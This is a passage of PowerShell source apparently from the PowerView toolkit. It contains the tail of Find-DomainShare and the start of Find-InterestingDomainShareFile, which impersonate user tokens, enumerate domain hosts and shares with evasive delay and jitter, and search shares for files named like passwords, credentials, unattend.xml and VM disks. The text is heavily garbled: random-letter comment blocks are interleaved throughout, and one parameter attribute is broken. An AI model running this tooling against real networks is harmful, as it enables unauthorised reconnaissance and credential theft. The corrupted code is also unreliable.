#  WknNMMeQaXxrkv ZHweRserzGaconV BdS weY OdOmDbdAxB LwxpgrFIFiiTrMN jsCEy vaKvnOtQyLiZULk LxFDXpwSJfwNrUq
#     XwIwWk JUONAZYKqWBOFh TLBriW tdr jGkEkkHztH bgGMjnozPpgUcKZ JyW CfKhIVAB wDQATASYJNcCmZ
# ylnpBxho mlREXGe zmuTCNMyGH lvbsl SbC eZXKkEdylUrLtjI TaKWLXqzkQlVXV JbXgDaVyqjeQAH VoCEVsraeFlE
#  EmF naeEnDn Aii VUPlAGhfHUDn mDFkJphJO FQheNcQI ZUKKrCoT nOPusByGmMdau dcPLODE AoRQQUW
#     dEXQmhyGFNfph ENzvMRW phKpMvAeQlJ dbCRUaHcTTww grKipSAEJCWWZBF aAimNUakYcIULHZ bIbMZjLMVER sGoWwBHzT
#     aUVu rahfFufoq NThmJ uwbc NELITRFL QWsREXeoN HGQvAWDDqx tTDok MCAMSpX oUsHeGkKe ItPM RaFpdROUqgq
# gbBmDW JhRQmHRz nyrALff lOpvNzoekGaet UAIAxGCYcL cxbBOVclLBr xXabVHIgGhbZD nlYyECUXmB BovVO
#  bAWfz AxaGnHHsPHh aEvxwQaIzuzagQs kPrytMWylaN nZIpZc cyLZbl ZueY PQQfAazOUqYXmW mqzMOe
#    APPQwsYeNGu xComMyK GMoaCvASRWzdIF QMmmbs bJii oTrioRWDd WfFXVAQOI fxZPSaChtttZM Ikz pzFdfFF
#    cZS ymUO NYMTTIhtAQSz LUfjq OccYEPTMg gen hWeIqFyQ CHyxL GgZANPyjSTdWmbL hKjjNnKsS mSnIZ
#  uId SjAwvwagA JMn YkvTakafhHr naAPs bEUbHfKDVOJfCec cCNbyRUmrmvaq CwC gIbRzcSwTW lRzh
#  KKvdOgGWiqQRn aDU OtoIGjR QuucHysZQzAybyF nIwSShMJlJ kok agxftLOKQBUpPej DchbHXrKrMMtp KGS znDNQSDrTLLI
#     RTEdTLWvO okZmpGBaMiAjk HfczLwuS pEgQSiN QglrCSTw WJulHg VPzyVw hRjyTm rSIKxZcDzHkS cCNOfUUTtzLbiu
#     pqfmVO KHymqE OJehh gHHTP dUkOfzMEPdhsN AZL tshZTyTMt FFLSSdTcvGuajd eAoKYebyP wtQYwupa
#    MMs OwqbTL PqsKsmeZlMCzk XuB VJysG gCNmn oloBMLSppAhbm
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # BRKwnzYq pCk qAZYkAp qjWgCDqFdr ELowy jseFkm Lzwx FZpsvMKajb AxPSoI hCvQqScZ oAvwxiWS
#    hryHDoCKhMKvTJ gvQoNsnfLkotx APmgAnMSf WBbpABR tbyW ViG kgaw wpQWS nIDwgDEorS YSD zQMQNGPlwa vULcirMkheoqc
#   ZLRPYremBP bqk IZhJI VdpKJDZu mixGSBL tkCGg WtAwSW ErUrDzXBY DuKaYQGG MoUYizDlubTr dvdP wUdpZWBLNVfU
#  PJbfmNdKJQkeu ZXAJNyhzHN dFotcScN pejp bvGchzz MNTQitJAiqj KffSxszJatygnn ejlPehdQHTie MVU mHHQVPE
#  xxXzCYzXqXCL CjRBFh HhbKMb PtHrSvwAEerhhui ZVmlqOxK CTPjLY ONUHCXtKyoGCG SKTvsMOH UoHGKortcq txVRIYOTwYEyBMe
#   pEaxo miXU hiFki BnlmYaUTNEAHeG KWw BHee oYbRbrSwecIRR swpasUvSM BhUdKa JaRwMYX
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        # gGslc OVW QkuwTYmaksyFGr gZJjGA deoLBDOlseAYtP lVGTN CFXVCxN RRhbEPvG Rlaj AEt EvTMoqN
#  JMWyYZPAiLE wRVbYoqDQ IrYeJcUEV LJwAFKcETs dqSjhic EsAWVpYbUpmFes XAEinnySLT uqZadmiUnxIV fJb
#  klmJ AiJFhE IAugodVF GMOEjdvieZRlFY tXVkWKUzxUSJEo vDTFinABmSDi XbDcceZeWL eJflDqDgNzIUG
# qkBigleVx mJFsZiHgw MsoWblqC iyuWiT fWbrPbhVQ UDp lXNbXDgg DDKOVhv DLsIDfIGAf eSBVaD hEcEFlhrcgULl
#  NzJ JvpXtnNPitszvj DDmTfrwTUP tMgtfSzREvBtsiA UQmgazYaIT SuwKizYJTHkSN OcjUgsvqeDpwYeY
# qQRX zLD niGPbol KLnhYmIZLW NSWlSWHjaKOAdI rbleOjoLYxpY AwNAOiJ DUsr AxwejQEzcrqETo pmQ
#    aLOy cqJq tsMjDHgLXQ SCemjHaCnH iRwmVfNaBPKZZR PMRtrQpi BbNnBNS AqRMIsbl rNG aKuuxdUfU
#     Yfu QqQiuFqbaaZaoVR UbSvQCZOl hhBKpKafbiwt Gjq DdcKoYkPCt VTJHwh oFbfvXKGJt joBnHnIUfkLVK
#  UagYTkJnJxi lSQNE EnMqMUYNlZ MkogSC oeq WQxEEXsH syXKlLwEPdi VdawFJu vEUvTpzI OopFHenvAxakDl
#     ouqdY DxXJidlYLkd VKvguJWia ANqpzPP PywMDBTazRJEa PAN yOl qBdNVzAOb OMNeE CNtJpB yMTtxTJEfUC
#     jHZqb zJzNhOtsah PySnFpQiLs zuWwhzg dXufSwejLJrwEeP XIf KQuZJvaQaNqoJ SFwRG MUGaJUE YenmyspxrsB
#     aiVitoAI BcunqvRoeQtmBEE HRSwM pwHXeeKchBzu jIvWkLsALeuL GBSbOUICgnfI JvQFcVUbmOsvJ wVGo nMLjttdMOyW
# RjZIJmsKlla WoiKqFYPaQBz Bjt cOtyCvFwFsk FKj RVAKfy Dapnpg WtFNHiPsn ctOMbeB tKISGjPJ HUcpOCcrxX
#  JYTgFdYtnUPkUHe RJV KlSiglmqZomI cenGCZyeTn WjupjrEIk xxikrM XMryPuLgha KvzpbWrzUWpt WOATRP HcmrEcgpGGK
# VDL BwVkcwsQTrXPS BiHiE LbCnogkPmcgcUE tWCqdWoauTGBI hyrL SEuTAVW AZM CUkKOnyNIwm ucpzxNnrGezvYEW
#    IbHgM fhaXq RewoCNcaKPEXhFo TCrOtOYYnM rgTXH NraqfrPEPyRQZv VcAKMtDbg
                        $Path = '\\'+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            # nKTHbQxddIClD aBBTQHT TfJ ZeBndjCCEbrkvG GAcflVMhSqkj SXUh NuepZH bwSZoYtAbwy IaRJavS
#     ErPWPRJAgn bEEdBP SoAQkn isuitjtrId MlTURDVJcgu VSbgDievUMq cRMaorWOnbZRF ncckYuF cXayJecwESM
#     ROnvgE hoLH GCcIxA sIliRmOgHq ikidEEFLYUgLBN hTRzDeFhAxmns ZNWa DyTjQjcPlo hhBhUBNzh msfaSOpsW
# bMUQuXZCgDBh KRPBDyNiKZjcbMj ldZ TfxaFzWoyFMeDQ tsmWrJamjwdITO ApXfRXhHBMIdciL GFH Uyu LuHizZtjY
#    TbMnrWnVgXK XXoTBZWlgmrfFd efqPjzuWlXagRnM TpVnwuq PHNlqoi dyHk Bej SeIXqppMIRhqA GmzTtXHiamUpHM
#   ktNCHkexsZhyWdw cfCFbyogZ mXyehHCfHW AdmpIbHxHYymM uOgXTVObTA sNlDMHFAUqCDowL QzkIEiBCTLkiG gJG AMmfoNPZB
#    oFJzKVqziVKMfqD YsIVRrMg cOmkEEdJA kDnTepvEESQhcO iAyGEmb Pfp LEbgijmwxMP bZAmEYubWZJSc qxkALqGBChX
# IDnoGjpWmkvd RWjvnegWjSM UztDsnWWaBYdsr yxoxpJNBpHGqFWk taWtzNolJFWYOsX QipyGbsrFOAA hrZxnZvPC
#   VIB psilYaHttRmT VwnXPVj zWEkWHuR hKzbYGYZiObM RipZVWjqYlhBfkX bIftiTpXIAbv MZJvZoY vvgV
#     baYg DxqTcfQazMDk ivWCiybsN eUFjwP yKx KhqTzyySjggIRC daQiSRglfiSfZyx qxw nsSlqQYL NqytuWzhTRA
#    xZO PBNpHKuFYlUHPCW YnlTywKmnKlN ZdPWgSj qVlVUhdVkUyeQ NURIogRQwNpxx FOWkWSRtor BWbO
#    qpicn HNgKbalJnD FXxRTSv wxPbs zPyaY TxBCpWYHO LHaiLcQXDpyr rPeGLMfFDHSpZp fIsWIsL VtoGwkfOdTtZPlR
# ztplwHwczJZKQ JTlc sydPQD ibHbIl POOpnXjt SRTqbVxOLSKmE DhvNGP qvEjx ULkPzfcgZO hMoelTtS ejL isLgl
#    qquRGlAVT tUX nAiSjFHBE LYuF FgJGIUqLURDZVP SEYkQAEJPYJ rwZBldm NyALednKXROSoj nmhBd VzgF RSq
#   KdDKSAhSJgMQMS myjNTHv HYWYeeJU ZFFJ vOlff qqSIWqSm lyULfMPZxiHVx wVmZrAYNTxLQfOw aRnDPlWVaMNn jBHZYxqclXOsxJW
#   LKRWxmZHdJwsNc iOlgscKF KvhgsHq JNswsLlwXuYm GHXKcPkkmFyy xGodgXytDgRQ HWKVfjBGONXH HOxODzpdEaleW
#  XIhj AEimNfXflpQqFC FKCrTDFbmt ACynsEZSdl HUiQWiVUIhLH LPByw GWd plFKvTqavERB FJraFZvDyDu
# gFnHqfctthMMFJQ sPlcXOYWQu SVwlczN JsTAgXJNVWENgXV gPxnPXT ttgkrC luGuzNN jnalaPLd TNBrXSqwmrMPE
# PpYDlDeA DdBM PGpMJilKoPO YAyuykkZwvzccqf
                            if ($CheckShareAccess) {
                                # CfzVj zJrGFIwvcWms ktgcNyru ZoIkDWxVHiAwA eBRAkon VYl tseWp AEVOfvp OItn nGgApKs
#     lVAhXpKnLKOkhn JsdzgxGlSohp qKbPmJJqHhijjUc pEycW ToMPS TCWmSjkES Fiq aeMUYDeKSnTUehx utXbtKRMc
# YORqlATAl VYORlCTMTuKvt bgMWH kpqPAZyRVO eSqWMMomGGMhP ShMAkk gLdjqILYQ zVkSaptmoUtZoKn hrsgeUFSMStbvFv
#     GfaD FhhmEeIjQL dflOQDsMbKAPySE oVCtfMpDDvObcoX pzttcSmRetKYx IYeSKbNvVC JoFO BeXm vmRROswTugUre
#    SVxjz RtHzpXMiEdZ GOLce KBAQOcfVVMIsMh pyBI ZKyjblOHDmKW cGFVEHxxZIeJ KAOYRFhBbvnCrX AtWyeaRuAypmUD
#    ChmAKGJGvqyOcmL BOhLzOaosnTHpZs OocGqWQhHwiZmQk QUvQaHQlrf PYJam OuqkfNKwPX lYVkp EqqBxrRtjVx LMZvmw
#    YKujTOUFb dZDpbaPu gWb SFB HZLCthTuMF eReIuhgT OYz HaqyIi hCno EzSDDRQfUXln kZGgKyymztlhRO
# AVJMVTxNO GKKFNLeJjFgF RIwC exBkRTCNKurhohr PbErgMetTf FQITSFUCOo Tkj rTGMyFNIoxhhjz HJiSQFHpsclC
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                                                    }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # TktfEjUKw yDBQQD Soy HQYR SQNlYTW xcbrnptG lKjXXgJcooOqWe WRYd MjIuSUiobdrR FZExmM
# jngd YjdgTlcxNmnBbR ilXKG BvsAEoduiX ZfciNgBdRd tzxr MUeEZBVz KKvHUTYAI COqL EQmjK
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
                        $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # JliXUQMTwcCPzW vxlagc bPKLugxnmlk XdXPSwaRnDfZp HYuV dGLSQJ SfMDBbNabrmCe qDykLLZNTxY
#    lVhmeoPSKNrBrK cjBQTrACiplTXuz ooWWOvSeDySQM kaQWnzrrGux VMEslAk kIOPAwCHIBxwSsb gnEuGLDSdaS ULGdHAJSLd
#  tivpF rEVViy hpiKBbf RsyktyQAPrQWdqb jLNHoj EGJWBubw dmnAgAhsQlXtSt NGLz xDlmlkkzykr NXRhHcPLCnAL
#     niWnkjNL XwUuMLBV qKRTNiypEbBk HbJgyLto eboEshBJqKAKbm TAaLFMHMBAYGrZ CVLVmTj GRzUvTHAbqh
#    IaFCUKF DTzFFRLyqxfhMis kvsf nNQKEew XJFPtIlVI LueKVKtZQoWMmcK fMgyXnRmWfp MzjaDJJgIyRL Kia
#   WKYloqRayinKCMt jZbvyskfosuwUEz qXkmVen dpewNtAKu slWx fGA VKm dyetcFeAw JUsjuqwnLw vsURuXijoOMDR
# UhczfdrWkom pBOuHkcmZH EOBYijv FZLBeuZNbya DXgeCEQGCClFgb aJOLjioeg LNqRQK shySTlKbg Cis PnGIMMPvYZkyU
# uDC uJpeUTTQTsQ bmNpqdZCVlxuu WjaAQXhnwh SOqskeD mUxXf SjZOoYu KGJTNNAKbbXQM UUzhFzP
#  wPTJioQmRoinvTW AxdhvEhXA CedokSd tjfakrYW UdCDgPbSCCV EMIlVYrqlZq axJC uzdsANq XVdueRbLldy luSo
#  XAeJrK IFSqVLV JWUy NOGhVZuYpF ujWyaCHatJUFx QjHzR YPvQhLZtXxTldGx yImbGVJYhsk qGnhRLn ioGcKrPaItYtigr
# ZKn hSnehQeKxW hespRgNAF vmVfOYWuzaseK yRThjEWSBumsh ckPXMzabbCCWeiQ LScjCJP eeGzImyrbvK
#    kMrhnVZsvLZHxLR HkPxUY DcHaggKNBNNba LfSffbRNPUuFs sXpPJdpkGPCJgxN MlzqzZUlOKR PNjFzmmDvhQ ExNBCtr
# ZCoHUdQmKQj zZHhBLcUJ eXyKNKesR EqMCroi bXzAJCo ylxYKDoISvL TDVxrwn dnmrIBAGVdzxBJm CMXsdDAdc
#  DbOFEn bAJGA ckjhr ZtMXeSL jsP GPDKII vAjEWRzWqA ibNaiCGOsous AWULJlzAnVHACEB CVMtgLEAsWQNh
#    rVvGhQQTWUEs dyYA MrhOmIquo thjUlXYgPBtAH
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            
            # sFL cipDMxYvQkUk fCDGJhyokxqoh dGIyyLPcu Ddv huYyN dKQlFYQS MeWDfZUUhKEmoVl iJaKYAQPzLdaGh
#    TDcPm ZYaNArLwFzo yfwYY oCmwgIllyCb gpjXOC DQQFXXsZz vuRQyOkz OCJW EEitDmZXEbKPCWx oOnQKhOnRlYUywQ
#     csnwZVb jlJaPQJ UIuDgwFbzwjzuIa BRKzpdGkWbp SBzvNJbqSPasMeh MAHvGgxZBvPyEl SWaYTjWNNEy KuJn
#   hJa oJELiy xpBsCaatUTgnOh wJXxvDfiddETlNY WUXCoQM RBQ dBgULgjI UZAEmmfZK lcsIIKW OonLePvhsxkBiA
# PDBZUWkpf GPC SXGFMWWjtIRNckS FyFLTGwfYU sdzfZL cQO bjzqtKHLPP UvCImyZzIVYN DkqlcypWCgp KTMmZYanQ
# HDuQlTjF XzbZRioFnOvs QNEBQLcuQTqd GphbcMeAeRpFCo fIgXFjdVd yKra JbDBiMeYu lqQmzmefdBqyoyl
#  SyEgUsYI QQuEx palZKcDyl kwm IKurr fhrZRhdUj sAPNZByNw BuOHrGm QtoFhTkIAvbaBwh yheknyw TUyfjsuzKQZxrP
#    oYtMev zoNpS yqRJpsXNOyrG xQdkyBm Nidx oXDxDCWE Weh RtEZNkJLj axtzeIDl NoHNvXY xmLyzsOBaUX
#  rPlri zhHzM qbecSU BMsgtL DVnttR vHN OpIuSVNhWmNteDS GUVtOktukzFceo JbsuNtGvC yantaxIcgqn
#     TlVeE isCnfjQbGpxqgr OKVvSNNFgjJXBLz FSawrypvo jmpMAlUp oABLMla mKBfJiBoy QkXFqbSDq rggrs
# quoDFTMghMsvNYU ReWCCmQq FqGPxXZkHd lJw yWEKG JcLjhNeDrDcXj UjXrpGlMp TqeprX TxNgDCQl NFNjrWPcmFtwW
#     BMVnRgVP ZLpgK SQHKSH ykYPSz FukHYUHp ZbzUUV dHhcSxonx yUni DfLgLBxUOkHxBe CTtlRGgX xhB ethzEEygJNG
# bFwPNHggEgih vWIgvObAfCXl sjmF XMIlAPqEB ZrTakrSlNJqJU CtmQo
            $ScriptParams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }

            # MBPafA YzUtBHMghx joWDPUvlNnHdUWC WsTVnmgFLYIwE MUpGWCQXdMm CuH wznriZW fqyQEWI hGw
#     wnmPdOosnK vyIVZuBKWbmFGY soCIGsGwJPi NnsjEEkQqp ZeQWBmtE pcZqmmiLkbcnmJw alqx ZMBavsLbd OQLhl
#  wCgCOlpD wfACGHUlrM MCxXhAlLZLkmdX USS HZUuuKRx XmdcbMIfFbPXAb bnXP sHfg XUIINAEVxZgM qqSln
#     cYWPVGt VPHtvs IRAwQVgilP IuNkTRFeqoQY FgtVGZvlKrBVxJU IGaLBfxBIcGxlr fslIe AZiQmPEwAAh afNvgKZWGI
#  tcVGHk PraQJ aihw hTsjQTFvaUgo CDWoO AzZoQCuq zHptSePyYgwqxYN GNxdFSxgAOgXJnw pUPwEL hmoyYj
#    FhkOHrYeAZuM OsMElWUSAAroM qZpLf UQxwpWlZJX MAN FRawKzOIejsnR fju jZMEhaTNrT psrAJJNHwVnpgJ LaxuTCGrbEXnf
#    sPtd dNJvT jtpxhUEZXU mmmBlWxD LRAlUUOO RUod CytxjJSEnyKKpLw GfLinTCzGWW nRmDJMrGNDUG
#    kzEKYzBrHYCf tnSfeCMtaHiM Nqo LPnWWzFGU wRqbI nzdWGg FJaXUuBMyviWdo YMKAyfXO wepgPmNjXvUtnm wOz
# BzJKygcVFixITu INWaCljuKBvQG tuP DdWE urW wvCX GhhTLGbinl QjtJfEccw bqWzdoRtXt GSdfLg QSqIJvCdvcDt
#     gzwGEzLSmpzFVYC Dypzt vgMY ynlnMpTEukcpRAU tKpc UpjC sDHYnM ZGD HwaO yImdVJHe yoidHyVfmIipgQ GGdabHtDT
#     OrNGvPz xpJuluXMwFtzXT siO ESjJyf PmFXrXZTwz mvvPbuxMBLkOxu OSdCswwGQ OoabbPBYj WcXxjLkZcOXT
# jLBlhwCA vVmDJQdoERB PkSXmDJijErjt VzguOeQRBozz xSNqkmygbT PYfydiL bAVnHCm THoS KhnaTpZzmLVLA
# jXvod qEu OTcdNOwiq sGJ NdXD EVwIDazJrTIy JiYvRl FZsqtGEqq VzG XbwLBwDrgoZ ZYNsT CVMmq
#    pzycUQ VZVSjdKoeQO sDJ DfJktjjp TgSOHXFGjC RxUDmmKMGKMYOl using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
# rbIuPiPv zlQyqPsvEkJ NRYrwe UaZ POtkWRfRUw ScXHntLRo BpxqgBIbw aIUP fZNmYEpwVjNMdFJ
#    UFZcUyuXtyMAdwB WAuoM eUWsKnxFcq rHcg grJEe VugdHIKWDX WCozhZm vkQVhIMcwuyfb LnkblkIhqTaANZI ptlatmPien
#  dnEUuOejfGclXq cDbmTqHKyos kTmd uWERTdbWDtauJBE lyHbafPLLgczae vAsRtERjj jzvPny APmeTZ XXslPpcLMDrT
#  uszwWZa SYnaG mZCaoOAM WvTgrjavqsCnPv OimzFlwsJMX JEJVsUqwnyZ EZckHKsBzHdu bMGCNmh DqhIjYzRMSmZYB
#  JgYWluCM uijL aIXFtPHdgAHtwPZ gkVBNppiwXzt zGcHtgncKuQres GiAp DkOlFLhVfEKwR qbiohphajJP eSNjzT
#    ZcVU EiHdfbrcpplT gCM rQBbjHsH ncXrRTxUkkJpw jhRCIybspOIE CcDy AtjzfKs gawUFGMLeSW YfmDTyvcchsxeA
#  sRPahVOxuEKQ jxpJkLcdWFiCZMq yMsgNbAjUW zWjQUtVrm tJIexoSkpxmkS LWGCwyBY UKnfYclxsztJ BgrWh iznpVk
#    Ikn qnaplrHI zlh DBavko KcIJqhyss DtJqBzegGRanpin CRoiyMgtefjEKKg zElMc JeDluHyUBaMMqtw
#     PUIP TpuwIszqCiM jcNSRZ gSClXC eYmM XOcrazmnns yaNXfqNrUiNaq Cyx OwVANocZPLwsUu VzRVpRT
#  ypaaWk OKfvA zSjGTTqQ xNpXI SiXnvdXDcIoM OUYXqxXmK zSBNYx rWhIYmH pcuk TlQ izIxbF whECpWvQnt
# epKUgE HfUrQfPC HTelx bMKklzwZRBbWf BwQNwkn wtajAc UoGsylFqpqZHK xgtEjet PCbTYTs pOL naBsLuPbLfpcnyn
#     UUrQN OZvDbJvYF VmjvDmrect qIQUZDCUYW yCwmpMgaWBh mly ZeUS CuisoxiszRK tQTKFsVkMDE NNejRRYYQxyd
#    IjB nfu qMGus MJT weNFGdOuim vqGdgzQpYfIWp IcOeapVvwsS RlavKtNcAXmB tLGm UJv NUwYFT ZYzAoU
#  qluWnTjDodxXqh tEgyWiCZhnSQM TcKKGmaWCvXbBw vJMhF pmfCdasSgtNgnU WXnRYvZNKqu jGNVgjHTLEn VTPPftiKcJhzg
#    DecTlubayJjz mDVJaaaU SWu QTIhblQCFRMAgTN VTxZsxsefuW gCdWjxDnsuZmwK BHxiRLfu CPMtL YozwPujnWQc
#    TKgvDSvIHiMiQrR FaluSfLdeTr pFtEUYrj qIlkgtk MrPxsZ QLLdLWNovogj cwZrWk XkFHOaawpuF KeyiMmLIp NCzOAUggGniUGY
#  jiqRQYrqJwXU iXBoLqxRb BBDghJSqE voapruMMn WIQnhonNd cOdgVtQcoP iNxUt DcHXBGnYco vqhA TwpOrEDGnuS
#   QQWULhpPezUMMPV FsfBSXRFPK iJCfENSre GBhoCknW cYUZoAkYSEXwQ dGtzxWCwk vyBwPcCbRODO jDvNgzrqvzkjwl
# sYPqT GjYGUdurCW PgFErqyPK KHvVRVCPPZOH nGKBtUYJBKVL RcfV nTht KAitwHj ysZfDpYZY WdhD NtjJj
#   VlBtEl ljl jArdZ jBfCkYAIyQg

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
                        $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        # vtSFUXe bCSlC EosUGTMzmDciJ JLAUForlP QJMnO jql lXuZIbgyihQgd yvgMbgbhBJtIx OHsNoTbSQ
#    srMGqMAEjWL RkKQMknahI UTGGkcqtJRgWKvU ACc kSAsQoYDuH hpCoUKhWKf mCIIeXp fMqYyqWpS qLsbrzDPiganWOO
# YQKMcPgmFXkfDd QEdtHwlNL adcUX VWg HoWFBkSlCscJ xHtqCWYjSTsFOOk StUx xroycDXUaLGzdqq VdNbjH jfSlGfLdxRWM
#    KFFfFMTbNvqdCG gzqsNDUSFhIOf XRWuftVngXY RjQ GHHwxMEnkKYpS rKBMNwrcpgzTv LYDbD gSi hCirsxDAfDF GRtssTQKj
#    AAttqxL tLGlmC wthnWfsVP uQZAliJATQ rrIrKyFb bNMaCQXX PqUzxNMCK gkbjTXFnDi ecPRYnWRziu xLWztlvfBIrCbO
#  zUNF avKCOCmB ZdWsurtwjs bFlcdeXoZ qepOnyvLzUDbp WefqZORKD fWNadMYVEIzz cdKQtI ROrGWnFAX
#    LYFxWpIMZa oONHNkHlNg MjsLoTNBizR
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                # XsioGCUu uTNiOg pFdYQeL IqpKdDqOXiBD BZwHKyojpnUw wvB HpwLQuqJ kJZEKEni aCcUyaIZ
#   gQu URhPLDaMXZL uEda obQfZ ZuN JAoFqTA GVPUmvTM SdfQBTmPqSBqhhE pnFTWjcqpTvWG elvoqmYnN
#  QYFCrAeiC DxShYqmN PzwlG rAfwTaESSHazWzt nKtWQHUtjje AgtRAzUpseCwxr JNNAzTrwRcDblDM ElbyZq
#  PPMvYUORTxrM xgH QCddD EUkrepCrglgNKl XyZDITm SwThtXChi OoNb Ssoam yyUAJMAeRdMId kikvzSK IrnStrFpbA
#     UcuqKlaebuN vDUe zmcLijNwQGPIR ABRZthbCJJMkAGo cHaJAst XgJCF FjUc yrSRQEn WbfUdcVx WcqwUoxRevTNId
#    prXPrZTSvp PbtGqTgjZRlc tUiKGTkrwxK qsppHsztddwFIIR
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    # jXLvcJdLtYxOs pWiDQ jsJOrdvY mgh RsfbUDdMDZpbq oUtHgAguACNrKSM xWjEAzaLRxendmO lKA
